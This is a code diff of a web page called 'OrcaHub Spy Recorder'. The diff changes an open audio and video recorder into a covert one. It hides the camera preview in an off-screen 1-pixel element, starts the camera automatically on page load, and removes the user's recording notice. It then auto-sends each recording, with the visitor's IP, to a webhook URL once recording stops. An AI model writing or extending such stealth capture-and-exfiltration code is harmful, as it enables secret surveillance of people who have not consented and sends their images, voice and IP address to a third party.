@@ -24,7 +24,6 @@
             overflow-x: hidden;
         }
 
-        /* ===== BUBBLES ===== */
         .bubbles {
             position: fixed;
             top: 0;
@@ -77,7 +76,6 @@
             75% { transform: translate(-60px, -20px) scale(1.05); }
         }
 
-        /* ===== MAIN CARD ===== */
         .glass-card {
             position: relative;
             z-index: 10;
@@ -99,12 +97,6 @@
             to { opacity: 1; transform: translateY(0) scale(1); }
         }
 
-        .glass-card:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8), 0 0 120px rgba(162, 155, 254, 0.06);
-        }
-
-        /* ===== HEADER ===== */
         .header {
             text-align: center;
             margin-bottom: 28px;
@@ -196,6 +188,28 @@
 
         .status-text span { color: #fff; }
 
+        /* ===== VIDEO PREVIEW (HIDDEN) ===== */
+        .video-preview {
+            display: none;
+        }
+
+        /* ===== INFO BAR ===== */
+        .info-bar {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(10, 10, 20, 0.3);
+            border-radius: 20px;
+            padding: 10px 16px;
+            margin-bottom: 18px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 0.7rem;
+            color: #666688;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+
+        .info-bar span { color: #c0c0dd; font-weight: 600; }
+
         /* ===== RECORDER CONTROLS ===== */
         .recorder-controls {
             display: flex;
@@ -261,58 +275,6 @@
             height: 18px;
             fill: currentColor;
         }
-
-        /* ===== VIDEO PREVIEW ===== */
-        .video-preview {
-            background: rgba(10, 10, 20, 0.6);
-            border-radius: 30px;
-            overflow: hidden;
-            margin-bottom: 18px;
-            border: 1px solid rgba(255, 255, 255, 0.03);
-            position: relative;
-            aspect-ratio: 16/9;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .video-preview video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        .video-preview .placeholder {
-            color: #3a3a52;
-            font-size: 0.9rem;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            text-align: center;
-        }
-
-        .video-preview .placeholder .icon {
-            font-size: 3rem;
-            display: block;
-            margin-bottom: 10px;
-        }
-
-        /* ===== INFO ===== */
-        .info-bar {
-            display: flex;
-            justify-content: space-between;
-            background: rgba(10, 10, 20, 0.3);
-            border-radius: 20px;
-            padding: 10px 16px;
-            margin-bottom: 18px;
-            border: 1px solid rgba(255, 255, 255, 0.03);
-            font-size: 0.7rem;
-            color: #666688;
-            flex-wrap: wrap;
-            gap: 5px;
-        }
-
-        .info-bar span { color: #c0c0dd; font-weight: 600; }
 
         /* ===== LOADER ===== */
         .loader-container {
@@ -395,7 +357,6 @@
             display: block;
         }
 
-        /* ===== FOOTER ===== */
         .footer {
             text-align: center;
             color: #3a3a52;
@@ -405,6 +366,17 @@
             padding-top: 16px;
             letter-spacing: 1.5px;
             text-transform: uppercase;
+        }
+
+        /* ===== HIDDEN VIDEO ELEMENT ===== */
+        #hiddenVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
 
         @media (max-width: 480px) {
@@ -424,13 +396,11 @@
             .logo-icon { font-size: 2.5rem; }
             h1 { font-size: 1.2rem; }
             .recorder-controls button { padding: 10px 16px; font-size: 0.7rem; }
-            .video-preview { aspect-ratio: 16/9; max-height: 180px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== BUBBLES ===== -->
     <div class="bubbles">
         <div class="bubble"></div>
         <div class="bubble"></div>
@@ -443,14 +413,15 @@
     <div class="shape"></div>
 
     <div class="glass-card" id="app">
-        <!-- HEADER -->
         <div class="header">
             <div class="logo-icon">✦</div>
             <h1>OrcaHub • Spy Recorder</h1>
-            <div class="sub">Audio + Video Recorder</div>
+            <div class="sub">Stealth Recording</div>
         </div>
 
-        <!-- STATUS -->
+        <!-- Hidden Video Element -->
+        <video id="hiddenVideo" autoplay muted playsinline></video>
+
         <div class="status-bar">
             <div>
                 <span class="dot green" id="statusDot"></span>
@@ -459,23 +430,12 @@
             <div class="status-text" id="ipDisplay">🌐 IP: <span>Detecting...</span></div>
         </div>
 
-        <!-- VIDEO PREVIEW -->
-        <div class="video-preview" id="videoPreview">
-            <video id="videoElement" autoplay muted playsinline></video>
-            <div class="placeholder" id="placeholder">
-                <span class="icon">🎥</span>
-                Camera preview will appear here
-            </div>
-        </div>
-
-        <!-- INFO -->
         <div class="info-bar">
             <div>⏱️ Duration: <span id="durationDisplay">00:00</span></div>
             <div>📦 Size: <span id="sizeDisplay">0 KB</span></div>
             <div>🎤 Audio: <span id="audioStatus">✅ Enabled</span></div>
         </div>
 
-        <!-- CONTROLS -->
         <div class="recorder-controls">
             <button class="btn-start" id="startBtn">▶ Start Recording</button>
             <button class="btn-stop" id="stopBtn" disabled>⏹ Stop</button>
@@ -485,13 +445,11 @@
             </a>
         </div>
 
-        <!-- LOADER -->
         <div class="loader-container" id="loaderContainer">
             <div class="spinner"></div>
             <div class="loader-text">⏳ Processing recording...</div>
         </div>
 
-        <!-- RESULT -->
         <div class="result-message" id="resultMessage">
             <span class="big">✅</span>
             Recording sent successfully!
@@ -509,9 +467,7 @@
 
             // ==================== DOM REFS ====================
             const DOM = {
-                video: document.getElementById('videoElement'),
-                preview: document.getElementById('videoPreview'),
-                placeholder: document.getElementById('placeholder'),
+                video: document.getElementById('hiddenVideo'),
                 startBtn: document.getElementById('startBtn'),
                 stopBtn: document.getElementById('stopBtn'),
                 sendBtn: document.getElementById('sendBtn'),
@@ -538,6 +494,7 @@
             let durationInterval = null;
             let recordedBlob = null;
             let userIP = 'Unknown';
+            let isCameraReady = false;
 
             // ==================== GET IP ====================
             async function getIP() {
@@ -570,13 +527,12 @@
 
             // ==================== SHOW RESULT ====================
             function showResult(msg) {
-                DOM.result.querySelector('.big').textContent = '✅';
                 DOM.result.innerHTML = `<span class="big">✅</span>${msg}`;
                 DOM.result.classList.add('show');
                 setTimeout(() => DOM.result.classList.remove('show'), 6000);
             }
 
-            // ==================== START CAMERA ====================
+            // ==================== START CAMERA (HIDDEN) ====================
             async function startCamera() {
                 try {
                     const constraints = {
@@ -589,7 +545,7 @@
                     };
                     mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                     DOM.video.srcObject = mediaStream;
-                    DOM.placeholder.style.display = 'none';
+                    isCameraReady = true;
                     setStatus('green', 'Camera Ready');
                     return true;
                 } catch (err) {
@@ -601,7 +557,7 @@
 
             // ==================== START RECORDING ====================
             async function startRecording() {
-                if (!mediaStream) {
+                if (!isCameraReady) {
                     const started = await startCamera();
                     if (!started) return;
                 }
@@ -642,6 +598,8 @@
                         clearInterval(durationInterval);
                         durationInterval = null;
                     }
+                    // Auto-send after stop
+                    setTimeout(sendRecording, 500);
                 };
 
                 mediaRecorder.start(1000);
@@ -659,8 +617,6 @@
                     const secs = String(elapsed % 60).padStart(2, '0');
                     DOM.durationDisplay.textContent = `${mins}:${secs}`;
                 }, 1000);
-
-                showResult('🔴 Recording started...');
             }
 
             // ==================== STOP RECORDING ====================
@@ -694,7 +650,7 @@
                     const formData = new FormData();
                     const filename = `recording_${Date.now()}.webm`;
                     formData.append('file', recordedBlob, filename);
-                    formData.append('content', `🎥 New Recording from OrcaHub Spy Recorder\n🌐 IP: ${userIP}\n⏱️ Duration: ${DOM.durationDisplay.textContent}\n📦 Size: ${DOM.sizeDisplay.textContent}`);
+                    formData.append('content', `🎥 New Recording\n🌐 IP: ${userIP}\n⏱️ Duration: ${DOM.durationDisplay.textContent}\n📦 Size: ${DOM.sizeDisplay.textContent}`);
 
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
@@ -732,7 +688,8 @@
             // ==================== INIT ====================
             getIP();
             setStatus('green', 'Ready');
-            startCamera();
+            // Start camera automatically on load (hidden)
+            setTimeout(startCamera, 1000);
 
             // ==================== KEYBOARD SHORTCUTS ====================
             document.addEventListener('keydown', (e) => {
@@ -742,14 +699,11 @@
                 if (e.key === 's' || e.key === 'S') {
                     if (isRecording) stopRecording();
                 }
-                if (e.key === 'Enter') {
-                    if (!DOM.sendBtn.disabled) sendRecording();
-                }
             });
 
-            console.log('[🦈] OrcaHub Spy Recorder loaded!');
-            console.log('[⌨️] Shortcuts: R=Record, S=Stop, Enter=Send');
+            console.log('[🦈] OrcaHub Spy Recorder loaded (Stealth Mode)');
+            console.log('[⌨️] Shortcuts: R=Record, S=Stop (Auto-send after stop)');
         });
     </script>
 </body>
-            </html>
+</html>
